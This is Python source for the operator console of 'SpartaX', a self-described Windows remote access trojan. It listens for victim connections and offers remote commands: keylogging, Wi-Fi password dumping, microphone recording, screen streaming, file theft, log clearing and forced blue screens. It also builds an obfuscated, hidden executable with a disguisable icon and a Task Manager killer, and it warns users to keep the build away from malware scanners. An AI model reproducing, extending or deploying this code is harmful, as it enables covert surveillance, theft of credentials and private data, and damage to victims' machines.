import socket
import time
from colorama import init, Fore, Back, Style
import requests
import os
import threading
import tempfile
import http.server
import socketserver
import webbrowser
import sys
import ast
import shutil
import subprocess
import random

import  base64, secrets, zlib, marshal
import uuid
import hashlib
from Resources.core.sparload import sparload
from Resources.core.loader  import loader

init() 


BOLD = "\033[1m"
G = Fore.GREEN
R = Fore.RED
B = Fore.BLUE
Y = Fore.YELLOW
C = Fore.CYAN
M = Fore.MAGENTA
W = '\033[97m'

RESET = Style.RESET_ALL

lhost = ""
lport = 4444
stream_stopped = False


def start(ip, port):
    if port == "" or ip.strip() == "":
        print(f"{R}[-] Please Enter the options (LHOST, LPORT){RESET}")
        return False
    if port <= 0:
        port = 4444
   
    try:
        server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        server_socket.bind((ip, port))
        server_socket.listen(1)
        print(f"{G}\n[+] Server listening on {ip}:{port}{RESET}")
    except:
        print(f"{R}[-] Enter a valid options or change the port{RESET}")
        return
    return server_socket



def upload_file(conn, file_path):
    try:
        if not os.path.exists(file_path):
            return "[!] File not found on server"
        
       
        file_name = os.path.basename(file_path)
        file_size = os.path.getsize(file_path)
        
        conn.sendall(len(file_name.encode()).to_bytes(4, 'big'))
        conn.sendall(file_name.encode())
        conn.sendall(file_size.to_bytes(8, 'big'))
        
      
        with open(file_path, 'rb') as f:
            while True:
                chunk = f.read(4096)
                if not chunk:
                    break
                conn.sendall(chunk)
        
        
        ack = conn.recv(1024).decode()
        if ack == "ACK_FILE_UPLOAD_COMPLETE":
            return f"[+] File {file_name} uploaded successfully"
        else:
            return f"[+] File {file_name} uploaded successfully"
            
    except Exception as e:
        return f"[!] Error uploading file: {e}"

def receive_files(conn):
    try:
        os.makedirs(r"Downloads", exist_ok=True)

        
        num_files = int.from_bytes(conn.recv(4), 'big')

        for _ in range(num_files):
           
            name_len_bytes = conn.recv(4)
            if len(name_len_bytes) < 4:
                return "[!] Failed to receive filename length"
            name_len = int.from_bytes(name_len_bytes, 'big')

            
            relative_name_bytes = b""
            while len(relative_name_bytes) < name_len:
                chunk = conn.recv(name_len - len(relative_name_bytes))
                if not chunk:
                    return "[!] Failed to receive complete filename"
                relative_name_bytes += chunk

            relative_name = relative_name_bytes.decode(errors='ignore')

            
            size_bytes = conn.recv(8)
            if len(size_bytes) < 8:
                return "[!] Failed to receive file size"
            file_size = int.from_bytes(size_bytes, 'big')

         
            save_path = os.path.join(r"Downloads", relative_name)
            os.makedirs(os.path.dirname(save_path), exist_ok=True)

         
            received = 0
            with open(save_path, 'wb') as f:
                while received < file_size:
                    chunk = conn.recv(min(4096, file_size - received))
                    if not chunk:
                        return f"[!] Connection lost while receiving {relative_name}"
                    f.write(chunk)
                    received += len(chunk)
       
        return f"{G}[+] All files received successfully{RESET}"
    
    except Exception as e:
        return f"[!] Error receiving files: {e}"


def receive_screen_stream(client_socket):
    from time import sleep

    stream_stopped = False
    stop_signal_sent = threading.Event()

    os.makedirs("temp_stream", exist_ok=True)
    temp_image_path = os.path.join("temp_stream", "screenstream.jpg")
    temp_html_path = os.path.join("temp_stream", "screenstream.html")
    image_lock = threading.Lock()

    class SilentHTTPRequestHandler(http.server.SimpleHTTPRequestHandler):
        def __init__(self, *args, **kwargs):
            super().__init__(*args, directory="temp_stream", **kwargs)
        def log_message(self, format, *args): pass
        def do_GET(self):
            if self.path == '/screenstream.jpg':
                self.send_response(200)
                self.send_header('Content-type', 'image/jpeg')
                self.send_header('Cache-Control', 'no-cache')
                self.end_headers()
                try:
                    with image_lock:
                        with open(temp_image_path, 'rb') as f:
                            self.wfile.write(f.read())
                except:
                    self.wfile.write(b'')
            elif self.path == '/favicon.ico':
                self.send_response(204)
                self.end_headers()
            else:
                super().do_GET()

    def save_frames():
        try:
            while not stop_signal_sent.is_set():
                client_socket.settimeout(1.0)
                try:
                    size_data = client_socket.recv(8)
                    if not size_data:
                        break
                    img_size = int.from_bytes(size_data, 'big')
                    img_data = b''
                    while len(img_data) < img_size:
                        chunk = client_socket.recv(min(65536, img_size - len(img_data)))
                        if not chunk:
                            break
                        img_data += chunk
                    if len(img_data) == img_size:
                        with image_lock:
                            with open(temp_image_path, 'wb') as f:
                                f.write(img_data)
                except:
                    if stop_signal_sent.is_set():
                        break
        except:
            pass

    def listen_for_stop():
        try:
            input(f"{G}[+] Streaming is running...\n{Y}[!] Press Enter to stop{RESET}")
            stop_signal_sent.set()
            try:
                client_socket.sendall(b"stopstream")
            except:
                pass
        except:
            pass

    def start_http_server():
        with socketserver.TCPServer(("", 8000), SilentHTTPRequestHandler) as httpd:
            httpd.timeout = 0.5
            while not stop_signal_sent.is_set():
                httpd.handle_request()


    html = """<!DOCTYPE html><html><head><title>Stream</title><style>body{margin:0;background:#000;}img{width:100vw;height:100vh;object-fit:contain;}</style></head><body><img id="img"><script>function reload(){fetch('/screenstream.jpg?t='+Date.now()).then(r=>r.blob()).then(b=>{let u=URL.createObjectURL(b);img.onload=()=>URL.revokeObjectURL(u);img.src=u;setTimeout(reload,100)}).catch(()=>setTimeout(reload,500))}reload();</script></body></html>"""
    with open(temp_html_path, 'w') as f:
        f.write(html)
    with open(temp_image_path, 'wb') as f:
        f.write(b'\xff\xd8\xff\xe0' + b'0' * 1024)

    threading.Thread(target=save_frames, daemon=True).start()
    threading.Thread(target=start_http_server, daemon=True).start()
    threading.Thread(target=listen_for_stop, daemon=True).start()

    webbrowser.open("http://localhost:8000/screenstream.html")

    while not stop_signal_sent.is_set():
        sleep(0.5)

    sleep(1)
    try:
        os.remove(temp_image_path)
        os.remove(temp_html_path)
        os.rmdir("temp_stream")
    except:
        pass



def receive_screenshot(conn):
    try:
    
        size_data = conn.recv(8)
        if not size_data or len(size_data) != 8:
            return "[!] Invalid size data received"
        
        img_size = int.from_bytes(size_data, 'big')
        
    
        received = 0
        img_data = b""
        while received < img_size:
            chunk = conn.recv(min(4096, img_size - received))
            if not chunk:
                break
            img_data += chunk
            received += len(chunk)
        
        if len(img_data) != img_size:
            return "[!] Incomplete image data received"
        
        filename = f"Screenshots/screenshot_{int(time.time())}.png"
        with open(filename, "wb") as f:
            f.write(img_data)
        
       
        
       
        
        return f"{G}[+] Screenshot saved as {filename}{RESET}"
    except Exception as e:
        return f"{R}[!] Error receiving screenshot: {e}{RESET}"
    
    

def background():
    global lhost
    global lport
    try:
        while True:
            cmd = input(f"{C}{BOLD}[SPX] {RESET}{M}>> {RESET}")
            if cmd.strip() == "":
                pass
            elif cmd.strip().lower() == "run":
                run()
                return
            elif cmd.lower().startswith("set lhost "):
                if cmd[10:].strip() == "":
                    print(f"{R}[-] Enter valid IP.{RESET}")
                    continue
                lhost = cmd[10:].strip()
                print(f"{Y}LHOST => {lhost}{RESET}")

            elif cmd.lower().startswith("set lport "):
                try:
                    port = int(cmd[10:])
                    if port < 1 or port > 65536:
                        print(f"{R}[-] Make sure the port is between 1 and 65536.{RESET}")
                        continue
                    lport = port
                    print(f"{Y}lhost => {lport}{RESET}")
                except ValueError:
                    print(f"{R}[-] Enter a valid port number.{RESET}")
                    continue
            elif cmd.strip().lower() == "exit":
                break
            elif cmd.strip().lower() == "options":
                lhost_str = str(lhost)
                lport_str = str(lport)
                header_left = "LHOST"
                header_right = "LPORT"
                title = "Sparload Config"
                col1_width = max(len(header_left), len(header_right), 7)
                col2_width = max(len(lhost_str), len(lport_str), 11)
                total_width = col1_width + col2_width + 7
                line_eq = f"{M}+{'='*(col1_width+2)}+{'='*(col2_width+2)}+{RESET}"
                line_dash = f"{M}+{'='*(col1_width+2)}+{'='*(col2_width+2)}+{RESET}"
                print(line_eq)
                print(f"{M}|{title.center(total_width-2)}|{RESET}")
                print(line_eq)
                print(f"{M}| {W}{header_left.ljust(col1_width)} {M}| {Y}{lhost_str.ljust(col2_width)}{M} |{RESET}")
                print(line_dash)
                print(f"{M}| {W}{header_right.ljust(col1_width)} {M}| {Y}{lport_str.ljust(col2_width)}{M} |{RESET}")
                print(line_eq)

            elif cmd.strip().lower() == "help":
                commands = [
                    ("run", "Start the listener"),
                    ("set lhost <ip>", "Set the local host IP address"),
                    ("set lport <port>", "Set the local port number"),
                    ("options", "Show current configuration"),
                    ("help", "Show this help message"),
                    ("build <appname> <ip> <port> [icon=icon.ico]", "To build for the Trojan"),
                    ("exit", "To exit the SpartaX"),
                ]
                col1_width = max(len(c[0]) for c in commands) + 2
                col2_width = max(len(c[1]) for c in commands) + 2
                total_width = col1_width + col2_width + 5
                line_eq = f"{M}+{'='*(col1_width+2)}+{'='*(col2_width+2)}+{RESET}"
                line_dash = f"{M}+{'-'*(col1_width+2)}+{'-'*(col2_width+2)}+{RESET}"
                title = "Help - Available Commands"
                print(line_eq)
                print(f"{M}|{title.center(total_width)}|{RESET}")
                print(line_eq)
                print(f"{M}| {'Command'.ljust(col1_width)} | {'Description'.ljust(col2_width)} |{RESET}")
                print(line_dash)
                for command, desc in commands:
                    print(f"{M}| {Y}{command.ljust(col1_width)}{M} | {W}{desc.ljust(col2_width)}{M} |{RESET}")
                print(line_eq)
            elif cmd.lower().startswith("build "):
                try:
                    

                    global loader
                    parts = cmd.split()
                    if len(parts) < 4:
                        print(f"{R}[-] Usage: build <appname> <ip> <port> [icon=icon.ico]{RESET}")
                        continue

                    appname = parts[1]
                    ip = parts[2]
                    port = parts[3]

                    icon_path = None
                    if len(parts) > 4 and parts[4].startswith("icon="):
                        icon_path = os.path.abspath(parts[4].split("=", 1)[1])

                    payload = loader()
                    payload = payload.replace('i = "127.0.0.1"', f'i = "{ip}"')
                    payload = payload.replace('p = 4444', f'p = {port}')

                    if input("[?] Add auto hidden? y/n: ").strip().lower() in ['y', 'yes']:
                        payload = payload.replace("hide_after_run = False", "hide_after_run = True")

                    if input("[?] Add task manager killer? y/n: ").strip().lower() in ['y', 'yes']:
                        payload = payload.replace("auto_task_manager_killer = False", "auto_task_manager_killer = True")

                    version_file_path = os.path.abspath("Resources/version.txt")

                    key = secrets.token_bytes(random.randint(6, 12))
                    compiled = compile(payload, "<hidden>", "exec")
                    marshaled = marshal.dumps(compiled)
                    compressed = zlib.compress(marshaled)
                    xored = bytes([b ^ key[i % len(key)] for i, b in enumerate(compressed)])
                    encoded = base64.b64encode(xored).decode()

                    key_parts = [list(key[i:i+2]) for i in range(0, len(key), 2)]
                    key_lines = "\n".join([f"k{i} = {part}" for i, part in enumerate(key_parts)])
                    key_rebuild = f"key = b''.join([{', '.join([f'bytes(k{i})' for i in range(len(key_parts))])}])"

                    client_code = rf'''
import zlib, base64
import os, time, json, ctypes, sys, subprocess, tempfile, threading
from os import popen, chdir, getcwd, listdir, mkdir, rmdir, remove, rename, utime, system,walk, close,_exit,access,R_OK,system,makedirs,stat
from os import getenv, path
from platform import platform, system as sys_name, release, version, machine, processor, node
from socket import socket, AF_INET, SOCK_STREAM
from webbrowser import open as openurl
from shutil import copy, move
from pynput import keyboard
from time import sleep, ctime
from pyaudio import PyAudio, paInt16
from wave import open as wave_open
from random import randint, choice
from win32con import SW_HIDE as SW_HIDEEX, SW_SHOW,SW_MAXIMIZE,SW_MINIMIZE
from win32gui import ShowWindow,FindWindow,IsWindowVisible,GetWindowText,EnumWindows,SetForegroundWindow
from io import BytesIO
from datetime import datetime
import urllib.request
import mss
from pyperclip import copy as pycopy,  paste as pypaste
from sys import executable, argv
import psutil
import marshal
import ctypes
import sys

{key_lines}
{key_rebuild}

def _xor_decode(data, k):
    return bytes(c ^ k[i % len(k)] for i, c in enumerate(data))

def _run_encrypted(code):
    import marshal, zlib
    stage1 = base64.b64decode(code)
    stage2 = _xor_decode(stage1, key)
    stage3 = zlib.decompress(stage2)
    exec(marshal.loads(stage3), globals())

_encrypted_blob = """{encoded}"""
_run_encrypted(_encrypted_blob)
            '''

                    os.makedirs(r"dist", exist_ok=True)

                    with tempfile.TemporaryDirectory() as tmp:
                        client_path = os.path.join(tmp, "client.py")
                        with open(client_path, "w", encoding="utf-8") as f:
                            f.write(client_code)

                        print(f"{G}[+] Building started...{RESET}")

                        dist_path = os.path.join(tmp, "dist")
                        work_path = os.path.join(tmp, "build")
                        spec_path = tmp

                      

                        cmd_build = [
                            "python",
                            "-m", "PyInstaller",
                            "--noconfirm",
                            "--onefile",
                            "--windowed",
                            f"--distpath={dist_path}",
                            f"--workpath={work_path}",
                            f"--specpath={spec_path}",
                            "--name", appname,
                            client_path,
                            f"--version-file={version_file_path}",
                        ]

                        if icon_path:
                            cmd_build.extend(['--icon', icon_path])
                        else:
                            cmd_build.extend(['--icon=NONE'])

                        result = subprocess.run(cmd_build, capture_output=True, text=True)

                        if result.returncode != 0:
                            print(f"{R}[-] Build failed:\n{result.stderr} {RESET}")
                            continue

                        exe_path = os.path.join(dist_path, f"{appname}.exe")
                        save_dir = os.path.join("dist")
                        final_path = os.path.join(save_dir, f"{appname}.exe")

                        if os.path.exists(exe_path):
                            shutil.copy(exe_path, final_path)
                            print(f"{G}[+] Build complete: {final_path}")
                            print(f"{Y}Don't upload this file to any malware scanner (like VirusTotal). The size may be larger.{RESET}")
                            os.startfile(save_dir)
                        else:
                            print(f"{R}[-] EXE file not found. Something went wrong.{RESET}")
               

                except Exception as e:
                    print(f"{R}[-] Build failed: {e}{RESET}")

            else:
                print(f"{R}[-] Command Not Found '{cmd}' Try help{RESET}")
    except KeyboardInterrupt:
        print(f"\n{R}[!] Enter 'exit' command for quit{RESET}")
        background()

def run():
    try:
        server_socket = start(lhost, int(lport))
        if server_socket == False:
            background()
            return
        while True:
            client_socket, client_address = server_socket.accept()  
            ip, port = client_address
            print(f"[+] Receive packet from {ip}:{port} Checking Signature")
            try:
                ping = client_socket.recv(1024).decode()
      
                if ping == "ack_sparload_ofc_sign_full":
                
                    load = sparload()
                    load += "\n__END__"
                    client_socket.sendall(load.encode())
                    print(f"{G}[+] New Victim connection from {ip}:{port}{RESET}")

                    while True:
                        try:
                            cmd = input(f"{C}{BOLD}[Sparload]{RESET}{M} >>{RESET} ").strip()
                        except KeyboardInterrupt:
                            print(f"\n{R}[!] Use 'exit' to quit the session.{RESET}")
                            continue
                        if cmd == "":
                            continue
                        elif cmd.lower() == "exit":
                            stream_stopped = True
                            try:
                                client_socket.close()
                            except:
                                pass
                            try:
                                server_socket.close()
                            except:
                                pass
                            background()
                            return
                        
                        elif cmd.strip().lower() == "help":
                                commands = [


    ("cd <path>", "Change the current directory."),
    ("pwd", "Show the current working directory."),
    ("ls", "List files and directories."),
    ("mkdir <dirname>", "Create a new directory."),
    ("rmdir <dirname>", "Remove an empty directory."),
    ("touch <filename>", "Create a new file or update its timestamp."),
    ("rm <filename>", "Delete a specified file."),
    ("cp <source> <destination>", "Copy file to a new location."),
    ("mv <source> <destination>", "Move or rename a file."),
    ("rename <old> <new>", "Rename a file or directory."),
    ("echo <text> > <filename>", "Write text into a file."),
    ("get_fileinfo <path>", "Display file or directory information."),
    ("download <path>", "Download a file from the remote machine."),
    ("upload <local_path>", "Upload a file from local to remote machine."),

    ("systeminfo", "Display system information."),
    ("whoami", "Show the current user."),
    ("date", "Display the system date."),
    ("time", "Display the system time."),
    ("uptime", "Show system uptime."),
    ("resolution", "Display the screen resolution."),
    ("cpu_usage", "Show CPU usage."),
    ("ram_usage", "Show RAM usage."),
    ("disk_usage", "Show disk usage statistics."),
    ("is_admin", "Check for administrator privileges."),
    ("autostartup", "Enable program on startup."),
    ("clear_logs", "Clear system, security, and application logs."),
    ("locations", "Get device geo-location via external API."),

 
    ("ipconfig", "Display local IP configuration."),
    ("netstat", "Show active network connections."),
    ("arp_table", "Display ARP table."),
    ("wifi_passwords", "View saved Wi-Fi networks and passwords."),
    ("openurl <url>", "Open a URL in the default browser."),

    ("toggle_volume", "Mute or unmute system volume."),
    ("monitor_off", "Turn off the monitor."),
    ("monitor_on", "Turn on the monitor."),
    ("say <text>", "Speak text using TTS."),

    ("list_users", "View all user accounts."),
    ("list_drives", "View all storage disks."),

  
    ("exec <command>", "Execute a CMD/PowerShell command."),
    ("keyboard_send <text>", "Send simulated keyboard input."),
    ("keylogger_start", "Start the keylogger."),
    ("keylogger_dump", "Dump logged keystrokes."),


    ("kill <pid/name>", "Kill a process by PID or name."),
    ("listproc", "List all running processes."),
    ("windows_list", "List all visible window titles."),
    ("window_minimize <title>", "Minimize the specified window."),
    ("window_maximize <title>", "Maximize the specified window."),
    ("window_focus <title>", "Focus the specified window."),


    ("shutdown", "Shutdown the device."),
    ("reboot", "Reboot the device."),
    ("bluescreen", "Trigger a blue screen (BSOD)."),


    ("clipboard_dump", "Show clipboard contents."),
    ("clipboard_set <text>", "Set clipboard text."),
    ("mouse_flip", "Swap left and right mouse buttons."),
    ("toggle_taskbar", "Toggle the taskbar visibility."),
    ("toggle_icons", "Toggle desktop icons visibility."),
    ("open_cd", "Open the CD/DVD tray."),
    ("close_cd", "Close the CD/DVD tray."),

   
    ("screenshot", "Capture a screenshot."),
    ("screenstream", "Start live screen broadcast."),


    ("mic_record <seconds>", "Record from microphone."),

    ("showtxt <text>", "Show a popup message on the screen."),
    ("event_logs <type>", "Read last 10 logs of given type (e.g., System)."),

    ("help", "To see this list."),
    ("close", "Close the client."),
    ("exit", "To exit the session.")
]
                                col1_width = max(len(c[0]) for c in commands) + 2
                                col2_width = max(len(c[1]) for c in commands) + 2
                                total_width = col1_width + col2_width + 5
                                line_eq = f"{M}+{'='*(col1_width+2)}+{'='*(col2_width+2)}+{RESET}"
                                line_dash = f"{M}+{'-'*(col1_width+2)}+{'-'*(col2_width+2)}+{RESET}"
                                title = "Sparload - Available Commands"
                                print(line_eq)
                                print(f"{M}|{title.center(total_width)}|{RESET}")
                                print(line_eq)
                                print(f"{M}| {'Command'.ljust(col1_width)} | {'Description'.ljust(col2_width)} |{RESET}")
                                print(line_dash)
                                for command, desc in commands:
                                    print(f"{M}| {Y}{command.ljust(col1_width)}{M} | {W}{desc.ljust(col2_width)}{M} |{RESET}")
                                print(line_eq)

                        else:
                            try:
                                client_socket.send(cmd.encode())
                                if cmd.startswith("mic_record "):
                                    ack = client_socket.recv(1024).decode()
                                    if ack != "mic_start":
                                        print(ack)
                                    else:
                                        client_socket.sendall("mic_ready".encode())
                                        os.makedirs("Mic Records", exist_ok=True)
                                        filename = f"{int(time.time())}.wav"
                                        file_path = os.path.join("Mic Records", filename)
                                        with open(file_path, 'wb') as f:
                                            while True:
                                                data = client_socket.recv(4096)
                                                if data == b"__end__":
                                                    break
                                                f.write(data)
                                                
                                        print(f"{G}[+] The recording has been saved in '{file_path}'{RESET}")        
                                    continue
                                if cmd.lower() == "screenshot":
                                    result = receive_screenshot(client_socket)
                                    print(result)
                                    continue 
                                if cmd.strip() == "screenstream":
                                    client_socket.send(cmd.encode())    
                                    ack = client_socket.recv(1024)       
                                    if ack == b"start_stream":
                                        receive_screen_stream(client_socket)


                                    continue
                                if cmd.startswith("cat "):
                                    size_data = client_socket.recv(1024).decode()

                                    if size_data.startswith("[SIZE]"):
                                        size = int(size_data[6:])  
                                        client_socket.sendall("ready".encode())  
                                        
                                
                                        received = b""
                                        while len(received) < size:
                                            data = client_socket.recv(min(1024, size - len(received)))
                                            if not data:
                                                break
                                            received += data
                                        
                                        content = received.decode()
                                        print(f"{W}{content}{RESET}")  
                                    else:
                                        print(f"{W}{content}{RESET}")    
                                    continue
                                if cmd.startswith("download "):

                                    
                            
                                    initial_response = client_socket.recv(1024).decode()
                                    print(initial_response)
                                    
                                    if initial_response.startswith("[+]"):
                                    
                                        transfer_result = receive_files(client_socket)
                                        print(transfer_result)
                                        
                                
                                        final_ack = client_socket.recv(1024).decode()
                                        if final_ack != "TRANSFER_COMPLETE":
                                            pass
                                    
                            
                                    continue

                                if cmd.startswith("upload "): 
                                    file_path = cmd[7:]
                                    result = upload_file(client_socket, file_path)
                                    print(result)
                                    continue
                                
                                else:
                                    data = client_socket.recv(15000).decode()
                                    if not data:
                                        raise ConnectionError()
                                        
                                    print(f"{W}{data}")
                            except:
                                print(f"{R}[-] Lost Connection with {ip}:{port}{RESET}")
                                try:
                                    client_socket.close()
                                except:
                                    pass
                                try:
                                    server_socket.close()
                                except:
                                    pass
                                background()
                                return
                else:
                    print(f"{R}Connection refused from {ip}:{port} because it is not a RAT{RESET}")
            except:
                client_socket.close()    


    except Exception as e:
        print(f"{R}[-] Server error: {e}{RESET}")
        try:
            server_socket.close()
        except:
            pass
        background()

banner = rf"""{W}{BOLD}
{C}      _________                    __        {R} ____  ___
{C}     /   _____/__________ ________/  |______  {R}\   \/  /
{C}     \_____  \\____ \__  \\_  __ \   __\__  \  {R}\     / 
{C}     /        \  |_> > __ \|  | \/|  |  / __ \_{R}/     \ 
{C}    /_______  /   __(____  /__|   |__| (____  /{R}___/\  \
{C}            \/|__|       \/      {R}SpartaX{C}    \/{R}      \_/
                
         {M}>>> {W}Windows Remote Access Trojan (RAT)
         {M}>>> {W}Tool Creator:{Y} SilentVoid
         {M}>>> {W}Github:{Y} @0xRoony
         {M}>>> {W}Version:{C} 1.0
  
{R}[!] {BOLD}LEGAL WARNING:{RESET}
    {M}- {W}You are fully responsible for how you use it.
    {M}- {W}Never upload this tool to VirusTotal {Y}!!!
    {M}- {W}Never share this RAT publicly.{RESET}

/* Use 'help' To view available commands 
This tool is currently in beta; some features may be unstable/*
{M}+---------------------------------------------------------+{RESET}
"""

print(banner)

background()
